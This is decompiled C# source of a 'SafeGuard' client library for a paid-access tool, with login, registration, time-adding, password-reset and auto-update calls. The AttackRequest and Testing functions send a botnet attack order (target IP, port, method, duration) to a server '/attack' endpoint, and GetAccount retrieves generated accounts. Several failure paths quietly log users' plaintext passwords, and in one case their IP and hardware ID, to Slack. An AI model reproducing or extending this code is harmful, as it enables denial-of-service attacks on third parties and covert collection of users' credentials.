using System;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;

namespace SafeGuard
{
	// Token: 0x0200001C RID: 28
	public class ClientFunctions
	{
		// Token: 0x060000DA RID: 218 RVA: 0x00003CD0 File Offset: 0x00001ED0
		public static LoginResponse Logout(LoginResponse lr, string password)
		{
			try
			{
				Utilities.getJSON(string.Format("{0}/UserLogout?", Config.MainUrl.Decrypt()), lr.ProgramId.Encrypt(), lr.UserName.Encrypt(), password.Encrypt());
			}
			catch
			{
				MessageBox.Show(Enums.Messaging.SafeGuardApiError.GetEnumDescription(), Enums.Messaging.AutoUpdateTitle.GetEnumDescription());
				try
				{
					Environment.Exit(0);
				}
				catch
				{
					Process.GetCurrentProcess().Kill();
				}
			}
			lr = null;
			return lr;
		}

		// Token: 0x060000DB RID: 219 RVA: 0x00003D6C File Offset: 0x00001F6C
		public static LoginResponse Login(string username, string password, string programid)
		{
			Tools.ProcessCheck();
			Guid guid = Guid.NewGuid();
			string clearText = username.ToLower();
			bool flag = false;
			LoginResponse result;
			if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password) || string.IsNullOrWhiteSpace(programid))
			{
				object arg = new
				{
					UserName = username,
					Password = password,
					ProgramId = programid
				};
				if (ClientFunctions.<>o__1.<>p__0 == null)
				{
					ClientFunctions.<>o__1.<>p__0 = CallSite<Action<CallSite, Type, object, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "LogToSlack", null, typeof(ClientFunctions), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				ClientFunctions.<>o__1.<>p__0.Target(ClientFunctions.<>o__1.<>p__0, typeof(SlackService), arg, "Tool/Login", Enums.Messaging.NullError.GetEnumDescription(), "tool-user");
				result = new LoginResponse
				{
					Message = Enums.Messaging.NullError.GetEnumDescription(),
					Failure = true
				};
			}
			else
			{
				CultureInfo provider = new CultureInfo("en-US");
				string clearText2 = DateTime.UtcNow.ToString(provider);
				Config.Name = string.Format("{0}:{1}:{2}:{3}", new object[]
				{
					guid.ToString().Encrypt(),
					clearText.Encrypt(),
					clearText2.Encrypt(),
					Config.reqkey.Encrypt()
				}).Encrypt();
				LoginResponse loginResponse = new LoginResponse();
				try
				{
					string json = Utilities.getJSON(string.Format("{0}/Login?", Config.MainUrl.Decrypt()), programid.Encrypt(), clearText.Encrypt(), password.Encrypt());
					loginResponse = JsonConvert.DeserializeObject<LoginResponse>(json);
					loginResponse.Message = "Successfully Logged In";
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError)
					{
						return new LoginResponse
						{
							Message = ((HttpWebResponse)ex.Response).StatusDescription,
							Failure = true
						};
					}
					return new LoginResponse
					{
						Message = Enums.Messaging.SafeGuardApiError.GetEnumDescription(),
						Failure = true
					};
				}
				loginResponse.FullName = loginResponse.FullName.Decrypt();
				string[] array = loginResponse.FullName.Split(new char[]
				{
					':'
				});
				if (array.Count<string>() != 4)
				{
					object arg = new
					{
						UserName = username,
						Password = password,
						ProgramId = programid
					};
					if (ClientFunctions.<>o__1.<>p__1 == null)
					{
						ClientFunctions.<>o__1.<>p__1 = CallSite<Action<CallSite, Type, object, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "LogToSlack", null, typeof(ClientFunctions), new CSharpArgumentInfo[]
						{
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
						}));
					}
					ClientFunctions.<>o__1.<>p__1.Target(ClientFunctions.<>o__1.<>p__1, typeof(SlackService), arg, "Tool/Login", Enums.Messaging.LoginError.GetEnumDescription(), "tool-user");
					result = new LoginResponse
					{
						Message = Enums.Messaging.LoginError.GetEnumDescription(),
						Failure = true
					};
				}
				else
				{
					string input = array[0].Decrypt();
					Guid guid2;
					if (!(flag = Guid.TryParse(input, out guid2)))
					{
						result = new LoginResponse
						{
							Message = Enums.Messaging.LoginError.GetEnumDescription(),
							Failure = true
						};
					}
					else
					{
						string b = array[1].Decrypt();
						if (programid != b)
						{
							result = new LoginResponse
							{
								Message = Enums.Messaging.LoginError.GetEnumDescription(),
								Failure = true
							};
						}
						else
						{
							DateTime d = default(DateTime);
							string s = array[2].Decrypt();
							try
							{
								flag = true;
								d = DateTime.Parse(s, provider);
							}
							catch
							{
								flag = false;
							}
							if (!flag)
							{
								result = new LoginResponse
								{
									Message = Enums.Messaging.LoginError.GetEnumDescription(),
									Failure = true
								};
							}
							else if (Math.Abs((DateTime.UtcNow - d).TotalSeconds) > 200.0)
							{
								result = new LoginResponse
								{
									Message = "Resync Windows Clock",
									Failure = true
								};
							}
							else
							{
								string b2 = array[3].Decrypt();
								if (Config.reskey != b2)
								{
									object arg = new
									{
										UserName = username,
										Password = password,
										ProgramId = programid,
										IpAddress = Tools.GetClientIP(),
										Date = DateTime.UtcNow.ToString(),
										HWID = Security.GetHID("C")
									};
									if (ClientFunctions.<>o__1.<>p__2 == null)
									{
										ClientFunctions.<>o__1.<>p__2 = CallSite<Action<CallSite, Type, object, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "LogToSlack", null, typeof(ClientFunctions), new CSharpArgumentInfo[]
										{
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
										}));
									}
									ClientFunctions.<>o__1.<>p__2.Target(ClientFunctions.<>o__1.<>p__2, typeof(SlackService), arg, "Tool/Login", Enums.Messaging.NullError.GetEnumDescription(), "tool-user");
									result = new LoginResponse
									{
										Message = "resp key",
										Failure = true
									};
								}
								else
								{
									loginResponse.FullName = null;
									result = loginResponse;
								}
							}
						}
					}
				}
			}
			return result;
		}

		// Token: 0x060000DC RID: 220 RVA: 0x000042B8 File Offset: 0x000024B8
		public static RegisterInformationObject Register(string username, string password, string token, string email, string programid)
		{
			Tools.ProcessCheck();
			RegisterInformationObject result;
			if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password) || string.IsNullOrWhiteSpace(token) || string.IsNullOrWhiteSpace(email) || string.IsNullOrWhiteSpace(programid))
			{
				result = new RegisterInformationObject
				{
					Message = Enums.Messaging.NullError.GetEnumDescription(),
					Failure = true
				};
			}
			else
			{
				RegisterInformationObject postObject = new RegisterInformationObject
				{
					Token = token.Encrypt(),
					Email = email.Encrypt()
				};
				try
				{
					if (Utilities.validateEmail(email))
					{
						Utilities.postJSON(string.Format("{0}/register?", Config.MainUrl.Decrypt()), postObject, programid.Encrypt(), username.Encrypt(), password.Encrypt());
						result = new RegisterInformationObject
						{
							Message = "Successfully Registered",
							Failure = false
						};
					}
					else
					{
						result = new RegisterInformationObject
						{
							Message = Enums.Messaging.RegisterError.GetEnumDescription(),
							Failure = true
						};
					}
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError)
					{
						result = new RegisterInformationObject
						{
							Message = ((HttpWebResponse)ex.Response).StatusDescription,
							Failure = true
						};
					}
					else
					{
						result = new RegisterInformationObject
						{
							Message = Enums.Messaging.RegisterError.GetEnumDescription(),
							Failure = true
						};
					}
				}
			}
			return result;
		}

		// Token: 0x060000DD RID: 221 RVA: 0x0000440C File Offset: 0x0000260C
		public static LoginResponse AddTime(string username, string password, string token, string programid)
		{
			Tools.ProcessCheck();
			string clearText = username.ToLower();
			LoginResponse result;
			if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password) || string.IsNullOrWhiteSpace(token) || string.IsNullOrWhiteSpace(programid))
			{
				result = new LoginResponse
				{
					Message = Enums.Messaging.NullError.GetEnumDescription(),
					Failure = true
				};
			}
			else
			{
				AddTimeObject postObject = new AddTimeObject
				{
					Token = token.Encrypt()
				};
				try
				{
					string text = Utilities.postJSON(string.Format("{0}/addtime?", Config.MainUrl.Decrypt()), postObject, programid.Encrypt(), clearText.Encrypt(), password.Encrypt());
					LoginResponse loginResponse = new LoginResponse();
					loginResponse = JsonConvert.DeserializeObject<LoginResponse>(text);
					loginResponse.Message = "Successfully Added Time";
					result = loginResponse;
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError)
					{
						result = new LoginResponse
						{
							Message = ((HttpWebResponse)ex.Response).StatusDescription,
							Failure = true
						};
					}
					else
					{
						result = new LoginResponse
						{
							Message = Enums.Messaging.AddTimeError.GetEnumDescription(),
							Failure = true
						};
					}
				}
			}
			return result;
		}

		// Token: 0x060000DE RID: 222 RVA: 0x00004534 File Offset: 0x00002734
		internal static void Testing(string username, string password, string programid, string attkip, string attkport, string attkmethod, string attktime)
		{
			string clearText = username.ToLower();
			BotnetObject postObject = new BotnetObject
			{
				AttkIp = attkip.Encrypt(),
				AttkPort = attkport.Encrypt(),
				AttkTime = attktime.Encrypt(),
				AttkMethod = attkmethod.Encrypt()
			};
			Utilities.postJSON(string.Format("{0}/attack?", Config.MainUrl.Decrypt()), postObject, programid.Encrypt(), clearText.Encrypt(), password.Encrypt());
		}

		// Token: 0x060000DF RID: 223 RVA: 0x000045B0 File Offset: 0x000027B0
		public static string AttackRequest(string username, string password, string programid, string attkip, string attkport, string attkmethod, string attktime, bool ASync)
		{
			Tools.ProcessCheck();
			string clearText = username.ToLower();
			string result;
			if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password) || string.IsNullOrWhiteSpace(programid) || string.IsNullOrWhiteSpace(attkip) || string.IsNullOrWhiteSpace(attkport) || string.IsNullOrWhiteSpace(attkmethod) || string.IsNullOrWhiteSpace(attktime))
			{
				result = Enums.Messaging.NullError.GetEnumDescription();
			}
			else
			{
				BotnetObject postObject = new BotnetObject
				{
					AttkIp = attkip.Encrypt(),
					AttkPort = attkport.Encrypt(),
					AttkTime = attktime.Encrypt(),
					AttkMethod = attkmethod.Encrypt()
				};
				try
				{
					if (Tools.validateIP(attkip))
					{
						if (ASync)
						{
							Task.Run(delegate()
							{
								ClientFunctions.Testing(username, password, programid, attkip, attkport, attkmethod, attktime);
							});
							result = "Successful";
						}
						else
						{
							result = Utilities.postJSON(string.Format("{0}/attack?", Config.MainUrl.Decrypt()), postObject, programid.Encrypt(), clearText.Encrypt(), password.Encrypt());
						}
					}
					else
					{
						result = Enums.Messaging.AttackError.GetEnumDescription();
					}
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError)
					{
						result = ((HttpWebResponse)ex.Response).StatusDescription;
					}
					else
					{
						result = Enums.Messaging.AttackError.GetEnumDescription();
					}
				}
			}
			return result;
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x0000477C File Offset: 0x0000297C
		public static void AutoUpdate(string Version, string ProgramId)
		{
			AutoUpdateObject autoUpdateObject = new AutoUpdateObject();
			try
			{
				string json = Utilities.getJSON(string.Format("{0}/AutoUpdate?progversion={1}", Config.MainUrl.Decrypt(), Version.Encrypt()), ProgramId.Encrypt(), "", "");
				autoUpdateObject = JsonConvert.DeserializeObject<AutoUpdateObject>(json);
			}
			catch
			{
				MessageBox.Show("Issue in attempting to access SafeGuard API.\rCould be your dll version.", Enums.Messaging.AutoUpdateTitle.GetEnumDescription());
				try
				{
					Environment.Exit(0);
				}
				catch
				{
					Process.GetCurrentProcess().Kill();
				}
			}
			if (autoUpdateObject.Enabled && Version != autoUpdateObject.Version)
			{
				if (Utilities.IsUrlValid(autoUpdateObject.Url))
				{
					try
					{
						Process.Start(autoUpdateObject.Url);
					}
					catch
					{
						MessageBox.Show("Invalid update Url.", Enums.Messaging.AutoUpdateTitle.GetEnumDescription());
					}
					MessageBox.Show(Enums.Messaging.AutoUpdateInstruction.GetEnumDescription(), Enums.Messaging.AutoUpdateTitle.GetEnumDescription());
				}
				else
				{
					MessageBox.Show("Invalid update Url.", Enums.Messaging.AutoUpdateTitle.GetEnumDescription());
				}
				try
				{
					Environment.Exit(0);
				}
				catch
				{
					Process.GetCurrentProcess().Kill();
				}
			}
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x000048C4 File Offset: 0x00002AC4
		public static ErrorResponse ForgotPassword(string username, string programid)
		{
			Tools.ProcessCheck();
			string clearText = username.ToLower();
			ErrorResponse result;
			if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(programid))
			{
				object arg = new
				{
					UserName = username,
					ProgramId = programid
				};
				if (ClientFunctions.<>o__7.<>p__0 == null)
				{
					ClientFunctions.<>o__7.<>p__0 = CallSite<Action<CallSite, Type, object, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "LogToSlack", null, typeof(ClientFunctions), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				ClientFunctions.<>o__7.<>p__0.Target(ClientFunctions.<>o__7.<>p__0, typeof(SlackService), arg, "Tool/Login", Enums.Messaging.NullError.GetEnumDescription(), "tool-user");
				result = new ErrorResponse
				{
					Message = Enums.Messaging.NullError.GetEnumDescription(),
					Failure = true
				};
			}
			else
			{
				ErrorResponse errorResponse = new ErrorResponse();
				try
				{
					string json = Utilities.getJSON(string.Format("{0}/ForgotPassword?", Config.MainUrl.Decrypt()), programid.Encrypt(), clearText.Encrypt(), "");
					errorResponse.Message = json;
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError)
					{
						return new ErrorResponse
						{
							Message = ((HttpWebResponse)ex.Response).StatusDescription,
							Failure = true
						};
					}
					return new ErrorResponse
					{
						Message = Enums.Messaging.SafeGuardApiError.GetEnumDescription(),
						Failure = true
					};
				}
				result = errorResponse;
			}
			return result;
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x00004A60 File Offset: 0x00002C60
		public static ErrorResponse ResetPassword(string username, string programid, string password, string passwordToken)
		{
			Tools.ProcessCheck();
			string clearText = username.ToLower();
			ErrorResponse result;
			if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(programid) || string.IsNullOrWhiteSpace(passwordToken))
			{
				object arg = new
				{
					UserName = username,
					ProgramId = programid
				};
				if (ClientFunctions.<>o__8.<>p__0 == null)
				{
					ClientFunctions.<>o__8.<>p__0 = CallSite<Action<CallSite, Type, object, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "LogToSlack", null, typeof(ClientFunctions), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				ClientFunctions.<>o__8.<>p__0.Target(ClientFunctions.<>o__8.<>p__0, typeof(SlackService), arg, "Tool/Login", Enums.Messaging.NullError.GetEnumDescription(), "tool-user");
				result = new ErrorResponse
				{
					Message = Enums.Messaging.NullError.GetEnumDescription(),
					Failure = true
				};
			}
			else
			{
				ResetPasswordObject resetPasswordObject = new ResetPasswordObject();
				resetPasswordObject.PassTok = passwordToken;
				ErrorResponse errorResponse = new ErrorResponse();
				try
				{
					string message = Utilities.postJSON(string.Format("{0}/ResetPassword?", Config.MainUrl.Decrypt()), resetPasswordObject, programid.Encrypt(), clearText.Encrypt(), password.Encrypt());
					errorResponse.Message = message;
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError)
					{
						return new ErrorResponse
						{
							Message = ((HttpWebResponse)ex.Response).StatusDescription,
							Failure = true
						};
					}
					return new ErrorResponse
					{
						Message = Enums.Messaging.SafeGuardApiError.GetEnumDescription(),
						Failure = true
					};
				}
				result = errorResponse;
			}
			return result;
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00004C14 File Offset: 0x00002E14
		public static AccountGen GetAccount(string username, string password, string programid, string type)
		{
			Tools.ProcessCheck();
			string clearText = username.ToLower();
			AccountGen result;
			if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password) || string.IsNullOrWhiteSpace(programid) || string.IsNullOrWhiteSpace(type))
			{
				object arg = new
				{
					UserName = username,
					ProgramId = programid
				};
				if (ClientFunctions.<>o__9.<>p__0 == null)
				{
					ClientFunctions.<>o__9.<>p__0 = CallSite<Action<CallSite, Type, object, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "LogToSlack", null, typeof(ClientFunctions), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				ClientFunctions.<>o__9.<>p__0.Target(ClientFunctions.<>o__9.<>p__0, typeof(SlackService), arg, "Tool/GetAccount", Enums.Messaging.NullError.GetEnumDescription(), "tool-user");
				result = new AccountGen
				{
					Message = Enums.Messaging.NullError.GetEnumDescription(),
					Failure = true
				};
			}
			else
			{
				AccountGen accountGen = new AccountGen();
				try
				{
					string json = Utilities.getJSON(string.Format("{0}/GetAccount?type={1}", Config.MainUrl.Decrypt(), type.Encrypt()), programid.Encrypt(), clearText.Encrypt(), password.Encrypt());
					accountGen = JsonConvert.DeserializeObject<AccountGen>(json);
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError)
					{
						return new AccountGen
						{
							Message = ((HttpWebResponse)ex.Response).StatusDescription,
							Failure = true
						};
					}
					return new AccountGen
					{
						Message = Enums.Messaging.SafeGuardApiError.GetEnumDescription(),
						Failure = true
					};
				}
				result = accountGen;
			}
			return result;
		}
	}
}
